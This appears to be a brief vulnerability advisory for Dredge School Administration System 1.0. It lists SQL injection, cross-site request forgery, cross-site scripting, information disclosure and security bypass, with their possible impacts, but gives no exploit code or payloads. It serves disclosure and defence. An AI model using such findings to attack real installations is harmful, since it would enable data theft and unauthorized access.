Dredge School Administration System is prone to the following security vulnerabilities:

1. An SQL-injection vulnerability
2. A cross-site request forgery vulnerability
3. A cross-site scripting vulnerability
4. An information-disclosure vulnerability
5. A security-bypass vulnerability

Exploiting these issues could allow an attacker to execute arbitrary script codes, steal cookie-based authentication credentials, compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, obtain sensitive information or bypass certain security restrictions to perform unauthorized actions.

Dredge School Administration System 1.0 is vulnerable; other versions may also be affected.
